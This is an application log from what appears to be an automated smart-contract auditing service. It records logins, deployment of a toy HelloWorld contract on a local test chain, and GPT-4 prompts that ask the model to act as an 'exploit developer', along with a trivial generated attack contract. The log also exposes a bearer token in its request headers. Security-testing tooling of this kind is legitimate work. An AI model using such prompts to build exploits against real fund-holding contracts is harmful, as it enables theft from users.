2025-07-06 13:30:48,897 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE4MTE4NDZ9.zlKLLjgnJCtuWCex6gpnbdB1yi15z8pzkFw1HOw7SyU', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 13:30:48,898 - api.auth - INFO - Request content type: application/json
2025-07-06 13:30:48,900 - api.auth - INFO - Processing JSON request
2025-07-06 13:30:48,901 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:30:49,384 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:30:49,387 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:30:49,389 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:30:49,392 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:30:49,394 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 13:30:49,403 - api.auth - INFO - Received login request with method: POST
2025-07-06 13:30:49,405 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE4MTE4NDZ9.zlKLLjgnJCtuWCex6gpnbdB1yi15z8pzkFw1HOw7SyU', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 13:30:49,406 - api.auth - INFO - Request content type: application/json
2025-07-06 13:30:49,407 - api.auth - INFO - Processing JSON request
2025-07-06 13:30:49,410 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:30:49,856 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:30:49,858 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:30:49,860 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:30:49,861 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:30:49,863 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 13:30:49,867 - api.auth - INFO - Received login request with method: POST
2025-07-06 13:30:49,869 - api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE4MTE4NDZ9.zlKLLjgnJCtuWCex6gpnbdB1yi15z8pzkFw1HOw7SyU', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-06 13:30:49,870 - api.auth - INFO - Request content type: application/json
2025-07-06 13:30:49,872 - api.auth - INFO - Processing JSON request
2025-07-06 13:30:49,874 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:30:50,326 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:30:50,330 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:30:50,335 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:30:50,339 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:30:50,341 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-06 13:30:52,293 - api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-06 13:30:52,303 - api.contract - INFO - Analyzing code snippet
2025-07-06 13:30:52,310 - api.contract - INFO - Starting contract analysis for user: 1
2025-07-06 13:30:52,314 - services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpos56db8c.sol
2025-07-06 13:30:52,323 - services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-06 13:30:52,324 - services.contract_service - INFO - Compiling contract...
2025-07-06 13:30:52,458 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-07-06 13:30:53,561 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-07-06 13:30:53,572 - solcx - INFO - Using solc version 0.8.0
2025-07-06 13:30:55,222 - services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-07-06 13:30:55,225 - services.contract_service - INFO - Deploying 1 contracts...
2025-07-06 13:30:55,750 - services.contract_service - INFO - Contract HelloWorld deployed at 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24
2025-07-06 13:30:55,752 - services.contract_service - INFO - Setting up contract HelloWorld...
2025-07-06 13:30:58,575 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-06 13:30:59,905 - services.contract_service - INFO - Contract HelloWorld setup completed
2025-07-06 13:30:59,906 - services.contract_service - INFO - Funding contract HelloWorld for attack testing...
2025-07-06 13:31:00,152 - services.contract_service - INFO - Contract HelloWorld funded
2025-07-06 13:31:00,154 - services.contract_service - INFO - Building contract observation...
2025-07-06 13:31:00,369 - services.contract_service - INFO - Contract observation built successfully
2025-07-06 13:31:00,371 - services.contract_service - INFO - Generating attack strategy...
2025-07-06 13:31:00,372 - services.contract_service - INFO - Running Slither analysis...
2025-07-06 13:31:05,119 - services.contract_service - WARNING - Failed to run Slither analysis: [Errno 2] No such file or directory: 'slither'
2025-07-06 13:31:05,144 - services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/services/contract_service.py", line 208, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 83, in run_slither
    result_json = subprocess.run(cmd_json)
                  ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'slither'

2025-07-06 13:31:05,146 - modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-06 13:31:05,147 - modules.attack_generator - INFO - Contract name: HelloWorld
2025-07-06 13:31:05,148 - modules.attack_generator - INFO - Using step number: 0 for model selection
2025-07-06 13:31:05,149 - modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-06 13:31:05,152 - modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-06 13:31:05,153 - modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-06 13:31:05,154 - modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-06 13:31:11,323 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-06 13:31:11,366 - modules.attack_generator - INFO - Received response from OpenAI API in 6.21 seconds
2025-07-06 13:31:11,376 - modules.attack_generator - INFO - Contract analysis completed in 6.21 seconds
2025-07-06 13:31:11,379 - modules.attack_generator - INFO - Vulnerability assessment: - **Permission Issue:** The `setMessage` function is `public` and unrestricted, meaning anyone can c...
2025-07-06 13:31:11,381 - modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-06 13:31:11,383 - modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-06 13:31:11,385 - modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-06 13:31:11,386 - modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-06 13:31:13,223 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-06 13:31:13,248 - modules.attack_generator - INFO - Received response from OpenAI API in 1.86 seconds
2025-07-06 13:31:13,255 - modules.attack_generator - INFO - Attack code generation completed in 1.86 seconds
2025-07-06 13:31:13,258 - modules.attack_generator - INFO - Generated attack code of type solidity with length 352
2025-07-06 13:31:13,260 - modules.attack_generator - INFO - Total attack strategy generation completed in 8.08 seconds
2025-07-06 13:31:13,262 - modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-06 13:31:13,267 - services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpos56db8c.sol",\n  "contracts": [\n    {\n      "contract_name": "HelloWorld",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "message",\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "string",\n              "name": "newMessage",\n              "type": "string"\n            }\n          ],\n          "name": "setMessage",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "message",\n          "signature": "message()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setMessage",\n          "signature": "setMessage(string)",\n          "inputs": [\n            {\n              "internalType": "string",\n              "name": "newMessage",\n              "type": "string"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99986650520000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "message": "Bonjour, voici mon message"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract HelloWorld {\\n    string public message;\\n\\n    constructor() {\\n        message = \\"Hello, world!\\";\\n    }\\n\\n    function setMessage(string memory newMessage) public {\\n        message = newMessage;\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:  \nThe contract `HelloWorld` is a simple storage contract that holds a single string variable `message`. It allows anyone to read the current message and to update it by calling `setMessage`. The contract does not hold any ETH or tokens, nor does it implement any complex business logic or permission controls.\n\n2. Vulnerability Assessment:  \n- **Permission Issue:** The `setMessage` function is `public` and unrestricted, meaning anyone can change the stored message at any time. While this is not necessarily a security vulnerability if the contract is intended to be fully open, it may be an undesired behavior if the message is meant to be controlled or immutable after deployment.  \n- **No ETH or Funds Handling:** The contract does not hold or manage ETH or tokens, so there are no reentrancy, arithmetic, or fund-related vulnerabilities.  \n- **No Backdoors or Unsafe Calls:** The contract uses only basic string storage and assignment, with no external calls or delegatecalls.\n\n3. Exploitation Requirements:  \n- No special setup is required. Any user can call `setMessage` to overwrite the current message with arbitrary content.\n\n---\n\n**Summary:**  \n- Solidity version: `^0.8.0`  \n- No critical vulnerabilities related to funds or business logic.  \n- The only notable issue is the lack of access control on `setMessage`, which allows anyone to change the stored message. This may be a design choice rather than a vulnerability.', 'contract_analysis': 'The contract `HelloWorld` is a simple storage contract that holds a single string variable `message`. It allows anyone to read the current message and to update it by calling `setMessage`. The contract does not hold any ETH or tokens, nor does it implement any complex business logic or permission controls.\n\n2.', 'vulnerability_assessment': '- **Permission Issue:** The `setMessage` function is `public` and unrestricted, meaning anyone can change the stored message at any time. While this is not necessarily a security vulnerability if the contract is intended to be fully open, it may be an undesired behavior if the message is meant to be controlled or immutable after deployment.  \n- **No ETH or Funds Handling:** The contract does not hold or manage ETH or tokens, so there are no reentrancy, arithmetic, or fund-related vulnerabilities.  \n- **No Backdoors or Unsafe Calls:** The contract uses only basic string storage and assignment, with no external calls or delegatecalls.\n\n3.', 'exploitation_requirements': '- No special setup is required. Any user can call `setMessage` to overwrite the current message with arbitrary content.', 'analysis_duration': 6.211916923522949}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The contract `HelloWorld` is a simple storage contract that holds a single string variable `message`. It allows anyone to read the current message and to update it by calling `setMessage`. The contract does not hold any ETH or tokens, nor does it implement any complex business logic or permission controls.\n\n2.\n\nVulnerability Assessment: - **Permission Issue:** The `setMessage` function is `public` and unrestricted, meaning anyone can change the stored message at any time. While this is not necessarily a security vulnerability if the contract is intended to be fully open, it may be an undesired behavior if the message is meant to be controlled or immutable after deployment.  \n- **No ETH or Funds Handling:** The contract does not hold or manage ETH or tokens, so there are no reentrancy, arithmetic, or fund-related vulnerabilities.  \n- **No Backdoors or Unsafe Calls:** The contract uses only basic string storage and assignment, with no external calls or delegatecalls.\n\n3.\n\nExploitation Requirements: - No special setup is required. Any user can call `setMessage` to overwrite the current message with arbitrary content.\n\n\nTarget Contract Address: 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n", 'attack_raw_response': '```solidity\npragma solidity 0.8.0;\n\ninterface IHelloWorld {\n    function setMessage(string calldata newMessage) external;\n}\n\ncontract HelloWorldAttack {\n    IHelloWorld target;\n\n    constructor(address _target) {\n        target = IHelloWorld(_target);\n    }\n\n    function attack(string calldata newMessage) external {\n        target.setMessage(newMessage);\n    }\n}\n```', 'code': 'pragma solidity 0.8.0;\n\ninterface IHelloWorld {\n    function setMessage(string calldata newMessage) external;\n}\n\ncontract HelloWorldAttack {\n    IHelloWorld target;\n\n    constructor(address _target) {\n        target = IHelloWorld(_target);\n    }\n\n    function attack(string calldata newMessage) external {\n        target.setMessage(newMessage);\n    }\n}', 'code_type': 'solidity', 'attack_duration': 1.8635435104370117}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpos56db8c.sol",\n  "contracts": [\n    {\n      "contract_name": "HelloWorld",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "message",\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "string",\n              "name": "newMessage",\n              "type": "string"\n            }\n          ],\n          "name": "setMessage",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "message",\n          "signature": "message()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "string",\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setMessage",\n          "signature": "setMessage(string)",\n          "inputs": [\n            {\n              "internalType": "string",\n              "name": "newMessage",\n              "type": "string"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99986650520000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "message": "Bonjour, voici mon message"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract HelloWorld {\\n    string public message;\\n\\n    constructor() {\\n        message = \\"Hello, world!\\";\\n    }\\n\\n    function setMessage(string memory newMessage) public {\\n        message = newMessage;\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:  \nThe contract `HelloWorld` is a simple storage contract that holds a single string variable `message`. It allows anyone to read the current message and to update it by calling `setMessage`. The contract does not hold any ETH or tokens, nor does it implement any complex business logic or permission controls.\n\n2. Vulnerability Assessment:  \n- **Permission Issue:** The `setMessage` function is `public` and unrestricted, meaning anyone can change the stored message at any time. While this is not necessarily a security vulnerability if the contract is intended to be fully open, it may be an undesired behavior if the message is meant to be controlled or immutable after deployment.  \n- **No ETH or Funds Handling:** The contract does not hold or manage ETH or tokens, so there are no reentrancy, arithmetic, or fund-related vulnerabilities.  \n- **No Backdoors or Unsafe Calls:** The contract uses only basic string storage and assignment, with no external calls or delegatecalls.\n\n3. Exploitation Requirements:  \n- No special setup is required. Any user can call `setMessage` to overwrite the current message with arbitrary content.\n\n---\n\n**Summary:**  \n- Solidity version: `^0.8.0`  \n- No critical vulnerabilities related to funds or business logic.  \n- The only notable issue is the lack of access control on `setMessage`, which allows anyone to change the stored message. This may be a design choice rather than a vulnerability.', 'reasoning': 'The contract `HelloWorld` is a simple storage contract that holds a single string variable `message`. It allows anyone to read the current message and to update it by calling `setMessage`. The contract does not hold any ETH or tokens, nor does it implement any complex business logic or permission controls.\n\n2.', 'summary': '- **Permission Issue:** The `setMessage` function is `public` and unrestricted, meaning anyone can change the stored message at any time. While this is not necessarily a security vulnerability if the contract is intended to be fully open, it may be an undesired behavior if the message is meant to be controlled or immutable after deployment.  \n- **No ETH or Funds Handling:** The contract does not hold or manage ETH or tokens, so there are no reentrancy, arithmetic, or fund-related vulnerabilities.  \n- **No Backdoors or Unsafe Calls:** The contract uses only basic string storage and assignment, with no external calls or delegatecalls.\n\n3.', 'code': 'pragma solidity 0.8.0;\n\ninterface IHelloWorld {\n    function setMessage(string calldata newMessage) external;\n}\n\ncontract HelloWorldAttack {\n    IHelloWorld target;\n\n    constructor(address _target) {\n        target = IHelloWorld(_target);\n    }\n\n    function attack(string calldata newMessage) external {\n        target.setMessage(newMessage);\n    }\n}', 'code_type': 'solidity', 'duration': 8.075460433959961}
2025-07-06 13:31:13,271 - services.contract_service - INFO - Has exploit code: True
2025-07-06 13:31:13,273 - services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-06 13:31:13,274 - services.contract_service - INFO - Final vulnerability determination: True
2025-07-06 13:31:13,275 - services.contract_service - INFO - Attack strategy summary: - **Permission Issue:** The `setMessage` function is `public` and unrestricted, meaning anyone can change the stored message at any time. While this is not necessarily a security vulnerability if the contract is intended to be fully open, it may be an undesired behavior if the message is meant to be controlled or immutable after deployment.  
- **No ETH or Funds Handling:** The contract does not hold or manage ETH or tokens, so there are no reentrancy, arithmetic, or fund-related vulnerabilities.  
- **No Backdoors or Unsafe Calls:** The contract uses only basic string storage and assignment, with no external calls or delegatecalls.

3.
2025-07-06 13:31:13,278 - services.contract_service - INFO - Analysis completed with status: KO
2025-07-06 13:31:13,280 - services.contract_service - INFO - Temporary file /tmp/tmpos56db8c.sol removed
2025-07-06 13:31:13,365 - api.contract - INFO - Report saved with filename: HelloWorld_2025-07-06_13-31, status: KO
2025-07-06 13:31:13,367 - api.contract - INFO - Analysis completed successfully, returning report
2025-07-06 13:31:13,371 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-06 13:31:13,373 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-06 13:31:13,375 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-06 13:31:13,377 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
